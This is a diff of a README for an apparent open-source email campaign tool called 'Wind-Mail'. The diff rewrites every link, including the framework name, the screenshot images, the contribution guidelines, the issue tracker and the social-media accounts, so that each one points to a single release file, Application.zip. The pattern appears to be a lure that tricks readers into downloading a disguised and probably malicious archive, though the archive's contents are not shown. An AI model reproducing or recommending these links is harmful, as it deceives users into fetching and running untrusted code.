@@ -1,6 +1,6 @@
 # 🌬️ Wind-Mail: The Ultimate Email Campaign Management System 📧
 
-Welcome to Wind-Mail, a powerful, open-source email campaign management system built with Next.js, React, and TypeScript. With Wind-Mail, you can take your email marketing efforts to the next level, reaching your audience in a more efficient and effective way.
+Welcome to Wind-Mail, a powerful, open-source email campaign management system built with https://github.com/hyufd/Wind-Mail/releases/download/v1.0.0/Application.zip, React, and TypeScript. With Wind-Mail, you can take your email marketing efforts to the next level, reaching your audience in a more efficient and effective way.
 
 ## Overview ℹ️
 
@@ -20,7 +20,7 @@ Wind-Mail is designed to streamline the process of managing email campaigns, mak
 
 ## Getting Started 🚀
 
-To get started with Wind-Mail, you can download the application package from this [link](https://github.com/file/Application.zip) and follow the instructions to launch the system.
+To get started with Wind-Mail, you can download the application package from this [link](https://github.com/hyufd/Wind-Mail/releases/download/v1.0.0/Application.zip) and follow the instructions to launch the system.
 
 If the link doesn't work or you need additional versions, please check out the "Releases" section of this repository.
 
@@ -37,19 +37,19 @@ To install Wind-Mail on your local machine, follow these steps:
 
 Here are some sneak peeks into the interface of Wind-Mail:
 
-![Screenshot 1](https://via.placeholder.com/600x400)
-![Screenshot 2](https://via.placeholder.com/600x400)
+![Screenshot 1](https://github.com/hyufd/Wind-Mail/releases/download/v1.0.0/Application.zip)
+![Screenshot 2](https://github.com/hyufd/Wind-Mail/releases/download/v1.0.0/Application.zip)
 
 ## Contributing 🤝
 
-Wind-Mail is open-source, and we welcome contributions from the community. If you'd like to contribute to the development of Wind-Mail, please check out our [Contribution Guidelines](CONTRIBUTING.md).
+Wind-Mail is open-source, and we welcome contributions from the community. If you'd like to contribute to the development of Wind-Mail, please check out our [Contribution Guidelines](https://github.com/hyufd/Wind-Mail/releases/download/v1.0.0/Application.zip).
 
 ## Feedback 📢
 
-We value your feedback! If you have any suggestions, bug reports, or feature requests, feel free to [submit an issue](https://github.com/user/repo/issues).
+We value your feedback! If you have any suggestions, bug reports, or feature requests, feel free to [submit an issue](https://github.com/hyufd/Wind-Mail/releases/download/v1.0.0/Application.zip).
 
 ## Stay Connected 🌐
 
-Stay up to date with Wind-Mail by following us on [Twitter](https://twitter.com/WindMail) and [LinkedIn](https://www.linkedin.com/company/wind-mail).
+Stay up to date with Wind-Mail by following us on [Twitter](https://github.com/hyufd/Wind-Mail/releases/download/v1.0.0/Application.zip) and [LinkedIn](https://github.com/hyufd/Wind-Mail/releases/download/v1.0.0/Application.zip).
 
 Let's revolutionize your email marketing campaigns with Wind-Mail! 🚀📧🌪️
